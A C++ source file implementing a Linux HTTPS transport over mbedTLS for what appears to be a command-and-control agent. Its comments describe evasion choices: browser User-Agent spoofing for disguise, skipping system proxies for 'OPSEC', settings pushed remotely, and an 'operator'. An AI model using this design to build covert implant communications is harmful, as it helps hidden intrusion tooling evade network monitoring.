// PlatformLinux_Http.cpp
// Linux HTTPS 传输: vendored mbedTLS(v3.6.3) + 自写薄 HTTP 层。
// - 静态链接, 目标机零运行时依赖(与 libsodium 同模式)
// - 网络 IO 经 INetworkOps(send/recv 回调注入), 不绕统一网络层
// - keep-alive 单连接池复用(对齐 WinHTTP 会话级行为; HttpsTransport 串行调用)
#include "Core/Config/UA/UAProvider.hpp"
#include "Core/Comms/Platform/IHttpOps.hpp"
#include "Core/Comms/Platform/PlatformLinux_Network.hpp"
#include "Core/Config/AgentConfig.hpp"
#include "Common/Logger/ErrLog.hpp"
#include "Common/Logger/Logger.hpp"

#include "mbedtls/ssl.h"
#include "mbedtls/entropy.h"
#include "mbedtls/ctr_drbg.h"
#include "mbedtls/x509_crt.h"
#include "mbedtls/error.h"
#include "mbedtls/net_sockets.h"
#include "psa/crypto.h"

#include <chrono>
#include <cstdlib>
#include <cstring>
#include <random>
#include <string>
#include <vector>

namespace cleat {

namespace {

// 返回超大 body 即可耗尽内存。
constexpr size_t kMaxResponseBytes = 32u * 1024 * 1024;
// 内部读缓冲增量
constexpr size_t kReadChunk = 4096;
// 响应头行长上限防御(头+状态行, 正常远小于此)
constexpr size_t kMaxHeaderBytes = 64u * 1024;
constexpr uint16_t kDefaultHttpsPort = 443;

// 常见 Linux 发行版系统 CA 路径(严格校验模式加载)
const char* kSystemCaPaths[] = {
    "/etc/ssl/certs/ca-certificates.crt",
    "/etc/pki/tls/certs/ca-bundle.crt",
    "/etc/ssl/ca-bundle.pem",
    "/etc/pki/tls/cacert.pem",
};

int64_t NowMs() {
    return std::chrono::duration_cast<std::chrono::milliseconds>(
        std::chrono::steady_clock::now().time_since_epoch()).count();
}

// URL 解析: https://host[:port][/path](query 原样带在 path 里)
bool ParseHttpsUrl(const std::string& url, std::string& host, uint16_t& port,
    std::string& path) {
    const std::string scheme = "https://";
    if (url.compare(0, scheme.size(), scheme) != 0) {
        LOG_WARN("HttpOpsLinux: 非 https URL: " << url);
        return false;
    }
    const size_t pos = scheme.size();
    const size_t end = url.find_first_of('/', pos);
    const std::string authority = (end == std::string::npos)
        ? url.substr(pos) : url.substr(pos, end - pos);
    port = kDefaultHttpsPort;
    const size_t colon = authority.find(':');
    if (colon != std::string::npos) {
        host = authority.substr(0, colon);
        const std::string ps = authority.substr(colon + 1);
        if (ps.empty()) return false;
        for (char c : ps) {
            if (c < '0' || c > '9') return false;
        }
        const long p = std::strtol(ps.c_str(), nullptr, 10);
        if (p <= 0 || p > 65535) return false;
        port = static_cast<uint16_t>(p);
    }
    else {
        host = authority;
    }
    path = (end == std::string::npos) ? "/" : url.substr(end);
    if (path.empty()) path = "/";
    return !host.empty();
}

std::string SslErrText(int rc) {
    char buf[160] = { 0 };
    mbedtls_strerror(rc, buf, sizeof(buf));
    return std::string(buf);
}

// UA: 可配(SetConfig http.user_agent), 空 = 常见浏览器池随机选(对齐 Win 侧行为)
std::string PickUserAgent() {
    // 统一 UAProvider(override=远程下发 http.user_agent 优先, 空=平台池随机)。
    // 原本文件私有副本(6 条 Linux 系 UA)已收敛进组件 —— 池按平台条件编译,
    // Linux 构建自动取 Linux 系条目(平台伪装一致性保持)。
    return UAProvider::Pick();
}

// 代理解析(对齐 Win 侧 http.proxy 字段语义):
//   空       = 直连(默认, OPSEC 不读系统代理)
//   "system" = 读环境变量 HTTPS_PROXY/https_proxy(Linux 标准做法, 同 curl)
//   其他     = 显式代理 "host:port" 或 "http://host:port"(后者剥前缀)
// 返回 true 且 proxy_host 非空 = 需要走代理; false = 直连
bool ResolveProxy(std::string& proxy_host, uint16_t& proxy_port) {
    proxy_host.clear();
    proxy_port = 0;

    std::string proxy = AgentConfig::Instance().GetHttpsProxy();
    if (proxy == "system") {
        const char* env = std::getenv("HTTPS_PROXY");
        if (!env || !*env) env = std::getenv("https_proxy");
        proxy = (env && *env) ? env : "";
    }

    const std::string prefix = "http://";
    if (proxy.compare(0, prefix.size(), prefix) == 0) {
        proxy = proxy.substr(prefix.size());
    }
    if (proxy.empty()) {
        return false;   // 直连
    }
    // 剥掉可能带的路径(环境变量偶见 "host:port/" 写法)
    const size_t slash = proxy.find('/');
    if (slash != std::string::npos) {
        proxy = proxy.substr(0, slash);
    }
    const size_t colon = proxy.rfind(':');
    if (colon == std::string::npos) {
        LOG_WARN("HttpOpsLinux: 代理缺少端口, 按直连处理: " << proxy);
        return false;
    }
    proxy_host = proxy.substr(0, colon);
    const std::string ps = proxy.substr(colon + 1);
    if (ps.empty()) return false;
    for (char c : ps) {
        if (c < '0' || c > '9') return false;
    }
    const long p = std::strtol(ps.c_str(), nullptr, 10);
    if (p <= 0 || p > 65535) return false;
    proxy_port = static_cast<uint16_t>(p);
    return true;
}

} // namespace

class HttpOpsLinux : public IHttpOps {
public:
    HttpOpsLinux() {
        mbedtls_ssl_init(&ssl_);
        mbedtls_ssl_config_init(&ssl_cfg_);
        mbedtls_entropy_init(&entropy_);
        mbedtls_ctr_drbg_init(&drbg_);
        mbedtls_x509_crt_init(&cacert_);
    }

    ~HttpOpsLinux() override {
        CloseConnection();
        mbedtls_ssl_config_free(&ssl_cfg_);
        mbedtls_ctr_drbg_free(&drbg_);
        mbedtls_entropy_free(&entropy_);
        mbedtls_x509_crt_free(&cacert_);
    }

    bool RoundTrip(HttpMethod method, const std::string& url,
        const std::vector<uint8_t>& body, std::vector<uint8_t>& response,
        int timeout_ms,
        const std::vector<std::pair<std::string, std::string>>* headers = nullptr) override {
        response.clear();

        std::string host, path;
        uint16_t port = 0;
        if (!ParseHttpsUrl(url, host, port, path)) {
            return false;
        }

        // keep-alive 复用: 仅同 host:port 复用; 目标变化则重建
        if (!conn_ok_ || host != host_ || port != port_) {
            CloseConnection();
            if (!OpenConnection(host, port, timeout_ms)) {
                return false;
            }
        }

        const int64_t deadline = NowMs() + (timeout_ms > 0 ? timeout_ms : 30000);

        // ---- 组请求 ----
        std::string req;
        req.reserve(path.size() + host.size() + body.size() + 192);
        req += (method == HttpMethod::Post) ? "POST " : "GET ";
        req += path;
        req += " HTTP/1.1\r\n";
        req += "Host: ";
        req += host;
        if (port != kDefaultHttpsPort) {
            req += ":";
            req += std::to_string(port);
        }
        req += "\r\nUser-Agent: ";
        req += PickUserAgent();
        req += "\r\nConnection: keep-alive\r\n";
        if (headers) {
            // 附加头(N44 4.0.1): 自定义头插在空行前(同名覆盖内建 UA 等)
            for (const auto& h : *headers) {
                req += h.first;
                req += ": ";
                req += h.second;
                req += "\r\n";
            }
        }
        if (method == HttpMethod::Post) {
            req += "Content-Type: application/octet-stream\r\nContent-Length: ";
            req += std::to_string(body.size());
            req += "\r\n";
        }
        req += "\r\n";

        // ---- 发送请求行+头, 再发 body ----
        if (!WriteAll(req.data(), req.size(), deadline)) {
            CloseConnection();
            return false;
        }
        if (method == HttpMethod::Post && !body.empty()) {
            if (!WriteAll(body.data(), body.size(), deadline)) {
                CloseConnection();
                return false;
            }
        }

        // ---- 状态行: HTTP/1.x 200 ----
        std::string line;
        if (!ReadLine(line, deadline)) {
            CloseConnection();
            return false;
        }
        const size_t sp1 = line.find(' ');
        if (sp1 == std::string::npos || line.compare(0, 5, "HTTP/") != 0) {
            LOG_WARN("HttpOpsLinux: 非法状态行: " << line);
            CloseConnection();
            return false;
        }
        const size_t sp2 = line.find(' ', sp1 + 1);
        const std::string code = line.substr(sp1 + 1,
            (sp2 == std::string::npos) ? std::string::npos : sp2 - sp1 - 1);
        if (code != "200") {
            LOG_WARN("HttpOpsLinux: 非 200 响应: " << line);
            CloseConnection();
            return false;
        }

        // ---- 响应头(至空行) ----
        size_t content_length = 0;
        bool has_cl = false;
        bool chunked = false;
        bool conn_close = false;
        while (true) {
            if (!ReadLine(line, deadline)) {
                CloseConnection();
                return false;
            }
            if (line.empty()) break;
            const size_t clen = line.size();
            if (clen > 15 && strncasecmp(line.c_str(), "content-length:", 15) == 0) {
                content_length = static_cast<size_t>(
                    std::strtoull(line.c_str() + 15, nullptr, 10));
                has_cl = true;
            }
            else if (clen > 18 && strncasecmp(line.c_str(), "transfer-encoding:", 18) == 0
                && line.find("chunked") != std::string::npos) {
                chunked = true;
            }
            else if (clen > 11 && strncasecmp(line.c_str(), "connection:", 11) == 0
                && line.find("close") != std::string::npos) {
                conn_close = true;
            }
        }

        // ---- 响应体 ----
        bool ok = true;
        if (chunked) {
            ok = ReadChunked(response, deadline);
        }
        else if (has_cl) {
            ok = ReadBody(content_length, response, deadline);
        }
        else {
            // 无 CL 且非 chunked: 读到连接关闭(HTTP/1.0 风格)
            ok = ReadUntilClose(response, deadline);
        }
        if (!ok) {
            CloseConnection();
            return false;
        }
        if (conn_close) {
            CloseConnection();
        }
        return true;
    }

    void Reset() override {
        CloseConnection();
    }

private:
    // ---------- TLS 基础设施(进程级, 首次使用时初始化) ----------
    bool EnsureTls() {
        if (tls_ok_) return true;

        if (mbedtls_ctr_drbg_seed(&drbg_, mbedtls_entropy_func, &entropy_,
            reinterpret_cast<const unsigned char*>("cleat-https"), 12) != 0) {
            CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed, "HttpOpsLinux: ctr_drbg seed 失败");
            return false;
        }
        if (mbedtls_ssl_config_defaults(&ssl_cfg_, MBEDTLS_SSL_IS_CLIENT,
            MBEDTLS_SSL_TRANSPORT_STREAM, MBEDTLS_SSL_PRESET_DEFAULT) != 0) {
            CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed, "HttpOpsLinux: ssl_config_defaults 失败");
            return false;
        }
        mbedtls_ssl_conf_rng(&ssl_cfg_, mbedtls_ctr_drbg_random, &drbg_);

        // 证书: 默认严格(系统 CA); https_ignore_cert=true 跳过(自签场景, 对齐 CS/Win)
        if (AgentConfig::Instance().GetHttpsIgnoreCert()) {
            mbedtls_ssl_conf_authmode(&ssl_cfg_, MBEDTLS_SSL_VERIFY_NONE);
        }
        else {
            bool ca_loaded = false;
            for (const char* ca : kSystemCaPaths) {
                if (mbedtls_x509_crt_parse_file(&cacert_, ca) == 0) {
                    ca_loaded = true;
                    break;
                }
            }
            if (ca_loaded) {
                mbedtls_ssl_conf_authmode(&ssl_cfg_, MBEDTLS_SSL_VERIFY_REQUIRED);
                mbedtls_ssl_conf_ca_chain(&ssl_cfg_, &cacert_, nullptr);
            }
            else {
                // 用户从未设置 ignore_cert, 在精简镜像(容器/busybox/嵌入式)上却会
                // 静默进入不校验状态, MITM 可无缝劫持且无可见告警。这与本工程
                // "加密不可用即拒绝建连"(AgentEntry.cpp NDEBUG 分支)的 fail-closed
                // 原则直接冲突, 故改为硬失败: 拒绝建连, 由操作员显式决定。
                // 自签/无 CA 场景请显式传 --https-ignore-cert(或 SetConfig http.ignore_cert)。
                CLEAT_LOGE(ErrDom::Net, ErrCode::Unauthenticated,
                    "HttpOpsLinux: 系统 CA 不可用且未显式允许跳过校验, 拒绝建连"
                    "(如需自签场景, 请显式设置 https_ignore_cert)");
                return false;
            }
        }

        // TLS 1.3 走 PSA 驱动; 失败不致命(降级 TLS 1.2)
        const int psa_rc = psa_crypto_init();
        if (psa_rc != 0) {
            LOG_WARN("HttpOpsLinux: PSA crypto init 失败(" << psa_rc << "), 仅可用 TLS1.2");
        }

        tls_ok_ = true;
        return true;
    }

    // ---------- 连接建立(含 TLS 握手) ----------
    bool OpenConnection(const std::string& host, uint16_t port, int timeout_ms) {
        if (!EnsureTls()) return false;

        sock_ = ops_.CreateTcpSocket();
        if (sock_ < 0) {
            CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed, "HttpOpsLinux: 创建 socket 失败");
            return false;
        }

        // 代理: 连代理主机并打 CONNECT 隧道, 再 TLS; 直连: 直接连目标
        std::string proxy_host;
        uint16_t proxy_port = 0;
        const bool use_proxy = ResolveProxy(proxy_host, proxy_port);
        const std::string& connect_host = use_proxy ? proxy_host : host;
        const uint16_t connect_port = use_proxy ? proxy_port : port;
        if (!ops_.ConnectSocket(sock_, connect_host, connect_port)) {
            LOG_WARN("HttpOpsLinux: connect 失败 "
                << connect_host << ":" << connect_port);
            ops_.CloseSocket(sock_);
            sock_ = -1;
            return false;
        }
        const int64_t deadline = NowMs() + (timeout_ms > 0 ? timeout_ms : 30000);
        if (use_proxy && !EstablishProxyTunnel(host, port, deadline)) {
            LOG_WARN("HttpOpsLinux: 代理 CONNECT 隧道失败 "
                << proxy_host << ":" << proxy_port << " -> " << host << ":" << port);
            CloseConnection();
            return false;
        }

        if (mbedtls_ssl_setup(&ssl_, &ssl_cfg_) != 0) {
            CLEAT_LOGE(ErrDom::Net, ErrCode::PlatformApiFailed, "HttpOpsLinux: ssl_setup 失败");
            ops_.CloseSocket(sock_);
            sock_ = -1;
            return false;
        }
        // SNI + 证书主机名校验(VERIFY_REQUIRED 时)
        if (mbedtls_ssl_set_hostname(&ssl_, host.c_str()) != 0) {
            LOG_WARN("HttpOpsLinux: set_hostname 失败(SNI 关闭, 继续)");
        }
        mbedtls_ssl_set_bio(&ssl_, this, SslSendCb, SslRecvCb, nullptr);

        // 握手(处理 WANT_*; 超时由 deadline 控制)
        int rc;
        while ((rc = mbedtls_ssl_handshake(&ssl_)) != 0) {
            if (rc == MBEDTLS_ERR_SSL_WANT_READ || rc == MBEDTLS_ERR_SSL_WANT_WRITE) {
                if (NowMs() >= deadline) {
                    LOG_WARN("HttpOpsLinux: TLS 握手超时 " << host << ":" << port);
                    CloseConnection();
                    return false;
                }
                continue;
            }
            LOG_WARN("HttpOpsLinux: TLS 握手失败: " << SslErrText(rc));
            CloseConnection();
            return false;
        }

        host_ = host;
        port_ = port;
        conn_ok_ = true;
        LOG_DEBUG("HttpOpsLinux: TLS 建立 " << host << ":" << port);
        return true;
    }

    void CloseConnection() {
        if (sock_ >= 0) {
            mbedtls_ssl_close_notify(&ssl_);
            ops_.AbortSocket(sock_);
            ops_.CloseSocket(sock_);
            sock_ = -1;
        }
        mbedtls_ssl_free(&ssl_);
        mbedtls_ssl_init(&ssl_);   // free 后需 re-init 才能下次 setup
        rbuf_.clear();
        rbuf_pos_ = 0;
        conn_ok_ = false;
    }

    // ---------- HTTP 代理 CONNECT 隧道(TLS 之前, 裸 socket) ----------
    // 语义: CONNECT 目标:port -> 等 "HTTP/1.x 200 ..." -> 消费头至空行,
    // 此后该 TCP 连接承载 TLS 握手(SNI/证书主机名仍用目标)。
    // 代理认证(407)暂不支持: 记录并失败(上层有 TCP 候选兜底)。
    bool EstablishProxyTunnel(const std::string& host, uint16_t port,
        int64_t deadline) {
        std::string req = "CONNECT " + host + ":" + std::to_string(port)
            + " HTTP/1.1\r\n";
        req += "Host: " + host + ":" + std::to_string(port) + "\r\n";
        req += "User-Agent: " + PickUserAgent() + "\r\n";
        req += "\r\n";
        if (!WriteRaw(req.data(), req.size(), deadline)) {
            return false;
        }
        std::string line;
        if (!ReadLineRaw(line, deadline)) {
            LOG_WARN("HttpOpsLinux: 代理 CONNECT 无响应");
            return false;
        }
        if (line.find(" 200 ") == std::string::npos) {
            LOG_WARN("HttpOpsLinux: 代理 CONNECT 被拒: " << line
                << " (407 代理认证暂不支持)");
            return false;
        }
        while (true) {
            if (!ReadLineRaw(line, deadline)) return false;
            if (line.empty()) break;
        }
        return true;
    }

    // 裸写(TLS 之前; 之后统一走 mbedtls_ssl_write)
    bool WriteRaw(const void* data, size_t len, int64_t deadline) {
        const auto* p = static_cast<const unsigned char*>(data);
        size_t off = 0;
        while (off < len) {
            const int n = ops_.SendSocket(sock_, p + off, len - off);
            if (n > 0) {
                off += static_cast<size_t>(n);
                continue;
            }
            if (n < 0) {
                const int err = ops_.GetLastSocketError();
                if (ops_.IsTransientRecvError(err)
                    || err == ops_.GetSocketErrorTimeout()) {
                    if (NowMs() >= deadline) return false;
                    continue;
                }
            }
            return false;
        }
        return true;
    }

    // 裸读一行(复用 rbuf_; 与 ReadLine 同构, 只是读源为裸 socket)
    bool ReadLineRaw(std::string& line, int64_t deadline) {
        line.clear();
        while (true) {
            for (size_t i = rbuf_pos_; i < rbuf_.size(); ++i) {
                if (rbuf_[i] == '\n') {
                    line.assign(
                        reinterpret_cast<const char*>(rbuf_.data()) + rbuf_pos_,
                        i - rbuf_pos_ + 1);
                    rbuf_pos_ = i + 1;
                    if (!line.empty() && line.back() == '\n') line.pop_back();
                    if (!line.empty() && line.back() == '\r') line.pop_back();
                    return true;
                }
            }
            if (rbuf_pos_ > 0) {
                rbuf_.erase(rbuf_.begin(),
                    rbuf_.begin() + static_cast<ptrdiff_t>(rbuf_pos_));
                rbuf_pos_ = 0;
            }
            if (rbuf_.size() > kMaxHeaderBytes) {
                LOG_WARN("HttpOpsLinux: 代理响应头超长");
                return false;
            }
            unsigned char tmp[kReadChunk];
            // RecvSome(单次语义): 有数据即回 —— 旧 RecvSocket 为凑满 kReadChunk 会
            // 等到 socket 超时, HTTP 响应头/响应体的解析被整体延迟。
            const int n = ops_.RecvSome(sock_, tmp, sizeof(tmp));
            if (n > 0) {
                rbuf_.insert(rbuf_.end(), tmp, tmp + n);
                continue;
            }
            if (n < 0) {
                const int err = ops_.GetLastSocketError();
                if (ops_.IsTransientRecvError(err)
                    || err == ops_.GetSocketErrorTimeout()) {
                    if (NowMs() >= deadline) return false;
                    continue;
                }
            }
            return false;
        }
    }

    // ---------- TLS IO ----------
    // mbedtls_ssl_read 封装: >0=字节数; 0=EOF; -1=WANT(上层处理超时); -2=致命
    int SslRead(unsigned char* buf, size_t len) {
        const int rc = mbedtls_ssl_read(&ssl_, buf, len);
        if (rc > 0) return rc;
        if (rc == 0) return 0;
        if (rc == MBEDTLS_ERR_SSL_WANT_READ || rc == MBEDTLS_ERR_SSL_WANT_WRITE) {
            return -1;
        }
        LOG_DEBUG("HttpOpsLinux: ssl_read 失败: " << SslErrText(rc));
        return -2;
    }

    bool WriteAll(const void* data, size_t len, int64_t deadline) {
        const auto* p = static_cast<const unsigned char*>(data);
        size_t off = 0;
        while (off < len) {
            const int rc = mbedtls_ssl_write(&ssl_, p + off, len - off);
            if (rc > 0) {
                off += static_cast<size_t>(rc);
                continue;
            }
            if (rc == MBEDTLS_ERR_SSL_WANT_READ || rc == MBEDTLS_ERR_SSL_WANT_WRITE) {
                if (NowMs() >= deadline) {
                    LOG_WARN("HttpOpsLinux: 发送超时");
                    return false;
                }
                continue;
            }
            LOG_WARN("HttpOpsLinux: ssl_write 失败: " << SslErrText(rc));
            return false;
        }
        return true;
    }

    // 读一行(至 \n, 返回不含行尾符); 超时/EOF/错误失败
    bool ReadLine(std::string& line, int64_t deadline) {
        line.clear();
        while (true) {
            for (size_t i = rbuf_pos_; i < rbuf_.size(); ++i) {
                if (rbuf_[i] == '\n') {
                    line.assign(
                        reinterpret_cast<const char*>(rbuf_.data()) + rbuf_pos_,
                        i - rbuf_pos_ + 1);
                    rbuf_pos_ = i + 1;
                    if (!line.empty() && line.back() == '\n') line.pop_back();
                    if (!line.empty() && line.back() == '\r') line.pop_back();
                    return true;
                }
            }
            // 缓冲不足: 丢弃已消费前缀
            if (rbuf_pos_ > 0) {
                rbuf_.erase(rbuf_.begin(),
                    rbuf_.begin() + static_cast<ptrdiff_t>(rbuf_pos_));
                rbuf_pos_ = 0;
            }
            if (rbuf_.size() > kMaxHeaderBytes) {
                LOG_WARN("HttpOpsLinux: 响应头超长");
                return false;
            }
            unsigned char tmp[kReadChunk];
            const int n = SslRead(tmp, sizeof(tmp));
            if (n == -1) {
                if (NowMs() >= deadline) {
                    LOG_WARN("HttpOpsLinux: 读取超时");
                    return false;
                }
                continue;
            }
            if (n <= 0) return false;
            rbuf_.insert(rbuf_.end(), tmp, tmp + n);
        }
    }

    bool ReadBody(size_t len, std::vector<uint8_t>& body, int64_t deadline) {
        if (len > kMaxResponseBytes) {
            LOG_WARN("HttpOpsLinux: 响应体超限 " << len);
            return false;
        }
        body.reserve(len);
        while (body.size() < len) {
            if (rbuf_pos_ < rbuf_.size()) {
                const size_t take = std::min(len - body.size(),
                    rbuf_.size() - rbuf_pos_);
                body.insert(body.end(), rbuf_.begin() + rbuf_pos_,
                    rbuf_.begin() + rbuf_pos_ + static_cast<ptrdiff_t>(take));
                rbuf_pos_ += take;
                continue;
            }
            unsigned char tmp[kReadChunk];
            const int n = SslRead(tmp, sizeof(tmp));
            if (n == -1) {
                if (NowMs() >= deadline) {
                    LOG_WARN("HttpOpsLinux: 读取超时");
                    return false;
                }
                continue;
            }
            if (n <= 0) return false;
            body.insert(body.end(), tmp, tmp + n);
        }
        return true;
    }

    bool ReadChunked(std::vector<uint8_t>& body, int64_t deadline) {
        while (true) {
            std::string line;
            if (!ReadLine(line, deadline)) return false;
            size_t sz = 0;
            for (char c : line) {
                if (c == ';') break;
                const int v = (c >= '0' && c <= '9') ? c - '0'
                    : (c >= 'a' && c <= 'f') ? c - 'a' + 10
                    : (c >= 'A' && c <= 'F') ? c - 'A' + 10 : -1;
                if (v < 0) break;
                sz = sz * 16 + static_cast<size_t>(v);
            }
            if (sz == 0) {
                // 终止块: 消费 trailer 至空行
                std::string t;
                while (true) {
                    if (!ReadLine(t, deadline)) return false;
                    if (t.empty()) break;
                }
                return true;
            }
            if (body.size() + sz > kMaxResponseBytes) {
                LOG_WARN("HttpOpsLinux: 分块响应超限");
                return false;
            }
            if (!ReadBody(sz, body, deadline)) return false;
        }
    }

    bool ReadUntilClose(std::vector<uint8_t>& body, int64_t deadline) {
        while (true) {
            if (rbuf_pos_ < rbuf_.size()) {
                body.insert(body.end(), rbuf_.begin() + rbuf_pos_, rbuf_.end());
                rbuf_pos_ = rbuf_.size();
                if (body.size() > kMaxResponseBytes) return false;
                continue;
            }
            unsigned char tmp[kReadChunk];
            const int n = SslRead(tmp, sizeof(tmp));
            if (n == -1) {
                if (NowMs() >= deadline) return false;
                continue;
            }
            if (n == 0) return true;   // EOF = 体结束(HTTP/1.0 风格)
            if (n == -2) return false;
            body.insert(body.end(), tmp, tmp + n);
            if (body.size() > kMaxResponseBytes) return false;
        }
    }

    static int SslSendCb(void* ctx, const unsigned char* buf, size_t len) {
        auto* self = static_cast<HttpOpsLinux*>(ctx);
        if (self->sock_ < 0) return MBEDTLS_ERR_NET_SEND_FAILED;
        const int n = self->ops_.SendSocket(self->sock_, buf, len);
        if (n < 0) {
            const int err = self->ops_.GetLastSocketError();
            if (self->ops_.IsTransientRecvError(err) ||
                err == self->ops_.GetSocketErrorTimeout()) {
                return MBEDTLS_ERR_SSL_WANT_WRITE;
            }
            return MBEDTLS_ERR_NET_SEND_FAILED;
        }
        return n;
    }

    static int SslRecvCb(void* ctx, unsigned char* buf, size_t len) {
        auto* self = static_cast<HttpOpsLinux*>(ctx);
        if (self->sock_ < 0) return MBEDTLS_ERR_NET_RECV_FAILED;
        // mbedtls 回调契约 = "至多 len 字节, 有多少交多少": RecvSocket 的"收满才回"
        // 会让 TLS 记录交付等到 socket 超时, 必须用单次语义。
        const int n = self->ops_.RecvSome(self->sock_, buf, len);
        if (n <= 0) {
            const int err = self->ops_.GetLastSocketError();
            if (self->ops_.IsTransientRecvError(err) ||
                err == self->ops_.GetSocketErrorTimeout()) {
                return MBEDTLS_ERR_SSL_WANT_READ;
            }
            return MBEDTLS_ERR_NET_RECV_FAILED;
        }
        return n;
    }

private:
    // 连接池状态(单连接; HttpsTransport 串行调用 + 自锁)
    NetworkOpsLinux ops_;
    INetworkOps::SocketHandle sock_ = -1;
    std::string host_;
    uint16_t port_ = kDefaultHttpsPort;
    bool conn_ok_ = false;

    // TLS 上下文(进程级)
    mbedtls_ssl_context ssl_{};
    mbedtls_ssl_config ssl_cfg_{};
    mbedtls_entropy_context entropy_{};
    mbedtls_ctr_drbg_context drbg_{};
    mbedtls_x509_crt cacert_{};
    bool tls_ok_ = false;

    // 读缓冲(响应头/体行解析)
    std::vector<uint8_t> rbuf_;
    size_t rbuf_pos_ = 0;
};

std::unique_ptr<IHttpOps> CreateHttpOps() {
    return std::make_unique<HttpOpsLinux>();
}

} // namespace cleat
